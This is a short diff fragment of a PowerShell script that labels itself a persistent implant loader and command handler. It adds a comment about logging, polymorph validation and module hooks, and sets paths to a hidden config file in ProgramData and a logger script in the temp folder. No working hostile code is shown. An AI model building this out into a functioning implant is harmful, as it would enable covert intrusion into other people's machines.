@@ -1,5 +1,6 @@
 # GhostResidency.ps1
 # Persistent implant loader and command handler
+# Updated with logging, polymorph validation, and new module hooks
 
 $cfgPath = "C:\ProgramData\.ghost.cfg"
 $logScript = "$env:TEMP\GhostLogger.ps1"
